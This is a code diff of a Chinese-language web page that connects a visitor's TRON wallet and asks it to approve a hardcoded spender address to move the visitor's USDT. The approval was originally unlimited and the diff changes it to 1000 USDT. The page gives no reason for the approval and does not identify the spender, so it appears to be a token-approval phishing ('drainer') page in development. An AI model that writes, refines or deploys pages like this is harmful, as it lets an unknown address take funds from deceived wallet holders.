@@ -5,58 +5,174 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>TRON USDT 授权</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             padding: 20px;
         }
-        .container { max-width:500px; margin:0 auto; padding:20px; }
-        .card { background:white; border-radius:24px; padding:24px; box-shadow:0 20px 40px rgba(0,0,0,0.1); }
-        h1 { font-size:28px; color:#333; margin-bottom:8px; }
-        .subtitle { color:#666; font-size:14px; margin-bottom:24px; }
-        .info-box { background:#f5f5f5; padding:12px; border-radius:12px; margin-bottom:16px; }
-        .info-label { font-size:12px; color:#666; }
-        .info-value { font-size:12px; color:#333; word-break:break-all; margin-top:4px; }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        }
+        
+        h1 {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        
+        .info-box {
+            background: #f5f5f5;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+        }
+        
+        .info-label {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .info-value {
+            font-size: 12px;
+            color: #333;
+            word-break: break-all;
+            margin-top: 4px;
+        }
+        
         .approve-btn {
-            width:100%; padding:16px; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
-            color:white; border:none; border-radius:16px; font-size:16px; font-weight:600; cursor:pointer; margin-top:16px;
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
         }
-        .approve-btn:active { transform:scale(0.98); }
-        .status { margin-top:16px; padding:12px; border-radius:12px; font-size:14px; text-align:center; }
-        .status.loading { background:#fff3cd; color:#856404; }
-        .status.success { background:#d4edda; color:#155724; }
-        .status.error { background:#f8d7da; color:#721c24; }
-        .hidden { display:none; }
+        
+        .approve-btn:active {
+            transform: scale(0.98);
+        }
+        
+        .status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .status.loading {
+            background: #fff3cd;
+            color: #856404;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
         .loading-spinner {
-            display:inline-block; width:16px; height:16px; border:2px solid #f3f3f3; border-top:2px solid #667eea;
-            border-radius:50%; animation:spin 1s linear infinite; margin-right:8px;
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
         }
-        @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
-        .address { font-family:monospace; font-size:12px; color:#667eea; }
-        .warning { background:#fff3cd; padding:12px; border-radius:12px; margin-bottom:16px; font-size:12px; color:#856404; text-align:center; }
-        .success-badge { display:inline-block; background:#28a745; color:white; padding:2px 8px; border-radius:12px; font-size:10px; margin-left:8px; }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .address {
+            font-family: monospace;
+            font-size: 12px;
+            color: #667eea;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            font-size: 12px;
+            color: #856404;
+            text-align: center;
+        }
+        
+        .success-badge {
+            display: inline-block;
+            background: #28a745;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            margin-left: 8px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="card">
             <h1>🔐 USDT 授权</h1>
-            <div class="subtitle">TRON 链 - 无限额度授权</div>
-            <div class="warning" id="warningBox">⚠️ 请在 TronLink / TokenPocket 的 DApp 浏览器中打开此页面</div>
+            <div class="subtitle">TRON 链 - 授权 1000 USDT</div>
+            
+            <div class="warning" id="warningBox">
+                ⚠️ 请在 TronLink / TokenPocket 的 DApp 浏览器中打开此页面
+            </div>
+            
             <div class="info-box">
                 <div class="info-label">授权地址</div>
                 <div class="info-value">TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA</div>
-                <div class="info-label" style="margin-top:12px;">授权额度</div>
-                <div class="info-value" style="color:#667eea; font-weight:600;">无限额度 (最大)</div>
+                <div class="info-label" style="margin-top: 12px;">授权额度</div>
+                <div class="info-value" style="color: #667eea; font-weight: 600;">1000 USDT</div>
             </div>
-            <div class="info-box" id="walletInfo" style="display:none;">
+            
+            <div class="info-box" id="walletInfo" style="display: none;">
                 <div class="info-label">已连接钱包</div>
                 <div class="info-value address" id="connectedAddress">-</div>
             </div>
+            
             <button class="approve-btn" id="connectBtn">连接钱包</button>
-            <button class="approve-btn hidden" id="approveBtn">授权 USDT</button>
+            <button class="approve-btn hidden" id="approveBtn">授权 1000 USDT</button>
             <div class="status hidden" id="status"></div>
         </div>
     </div>
@@ -66,8 +182,8 @@
         // 配置
         const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
         const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
-        // 无限额度 2^256 - 1 的十进制字符串
-        const MAX_UINT256_STR = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        // 1000 USDT（USDT 精度为 6，所以 1000 * 10^6 = 1000000000）
+        const AMOUNT_1000_USDT = '1000000000';
         
         let tronWeb = null;
         let userAddress = null;
@@ -90,11 +206,13 @@
         
         async function connectWallet() {
             showStatus('正在连接钱包...', 'loading');
+            
             try {
                 if (!isInWalletBrowser()) {
                     showStatus('请在 TronLink 或 TokenPocket 的 DApp 浏览器中打开此页面', 'error');
                     return false;
                 }
+                
                 if (window.tronLink && window.tronLink.ready) {
                     await window.tronLink.request({ method: 'tron_requestAccounts' });
                     tronWeb = window.tronLink.tronWeb;
@@ -103,15 +221,20 @@
                 } else {
                     throw new Error('无法连接钱包');
                 }
+                
                 userAddress = tronWeb.defaultAddress.base58;
+                
                 document.getElementById('walletInfo').style.display = 'block';
                 document.getElementById('connectedAddress').textContent = `${userAddress.slice(0, 8)}...${userAddress.slice(-6)}`;
                 document.getElementById('connectBtn').classList.add('hidden');
                 document.getElementById('approveBtn').classList.remove('hidden');
                 document.getElementById('warningBox').style.display = 'none';
+                
                 showStatus(`连接成功！`, 'success');
                 setTimeout(() => hideStatus(), 1500);
+                
                 return true;
+                
             } catch (error) {
                 console.error('连接失败:', error);
                 showStatus('连接失败: ' + error.message, 'error');
@@ -124,23 +247,31 @@
                 showStatus('请先连接钱包', 'error');
                 return;
             }
+            
             showStatus('正在构造授权交易...', 'loading');
+            
             try {
-                // 获取合约实例
+                // 获取 USDT 合约实例
                 const contract = await tronWeb.contract().at(TRON_USDT_CONTRACT);
-                // 将金额转换为 BigNumber（使用十进制字符串）
-                const amount = tronWeb.toBigNumber(MAX_UINT256_STR);
-                // 调用 approve 方法
+                
                 showStatus('请在钱包中确认授权...', 'loading');
-                const result = await contract.approve(SPENDER_ADDRESS, amount).send();
+                
+                // 发送授权交易，使用普通数字字符串
+                const result = await contract.approve(
+                    SPENDER_ADDRESS,
+                    AMOUNT_1000_USDT
+                ).send();
+                
                 console.log('授权结果:', result);
+                
                 if (result && (result.result || result.txid)) {
                     const txid = result.txid || result;
                     showStatus(`✅ 授权成功！`, 'success');
-                    document.getElementById('connectedAddress').innerHTML = `${userAddress.slice(0, 8)}...${userAddress.slice(-6)} <span class="success-badge">已授权</span>`;
+                    document.getElementById('connectedAddress').innerHTML = `${userAddress.slice(0, 8)}...${userAddress.slice(-6)} <span class="success-badge">已授权 1000 USDT</span>`;
                 } else {
                     showStatus('授权失败，请重试', 'error');
                 }
+                
             } catch (error) {
                 console.error('授权错误:', error);
                 if (error.message.includes('denied') || error.message.includes('reject') || error.message.includes('cancelled')) {
